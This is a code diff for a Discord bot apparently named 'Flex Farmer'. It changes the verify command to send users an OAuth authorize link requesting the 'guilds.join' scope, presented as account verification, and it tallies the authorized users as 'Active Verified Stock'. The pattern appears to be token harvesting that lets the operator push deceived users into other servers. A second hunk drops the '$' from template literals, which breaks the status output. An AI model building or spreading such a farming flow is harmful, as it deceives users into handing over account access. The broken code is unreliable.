@@ -395,18 +395,20 @@ client.on('messageCreate', async message => {
     }
 
     if (command === 'verify' || command === 'link') {
-        const verifyChannelUrl = 'https://discord.com/channels/1509295298365886474/1563253454653235261';
+        const verificationClientId = process.env.VERIFICATION_CLIENT_ID || process.env.CLIENT_ID || '1561438987464483048';
+        const redirectUri = process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app';
+        const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${verificationClientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify+guilds.join`;
 
         const embed = new EmbedBuilder()
             .setTitle('Account Verification')
-            .setDescription('Click the button below to navigate to the verification channel.')
+            .setDescription('Click the button below to authorize your account.')
             .setColor(EMBED_COLOR);
 
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder()
-                .setLabel('Open Verification Channel')
+                .setLabel('Verify Account')
                 .setStyle(ButtonStyle.Link)
-                .setURL(verifyChannelUrl)
+                .setURL(oauthUrl)
         );
 
         return message.channel.send({ embeds: [embed], components: [row] });
@@ -482,8 +484,8 @@ client.on('messageCreate', async message => {
             .setTitle('Flex Farmer Status')
             .setColor(EMBED_COLOR)
             .addFields(
-                { name: 'Active Verified Stock', value: `\`${users.length}\` accounts`, inline: true },
-                { name: 'Uptime', value: `\`${hours}h ${minutes}m ${seconds}s\``, inline: true }
+                { name: 'Active Verified Stock', value: `\`{users.length}\` accounts`, inline: true },
+                { name: 'Uptime', value: `\`{hours}h {minutes}m {seconds}s\``, inline: true }
             );
         return message.channel.send({ embeds: [statusEmbed] });
     }
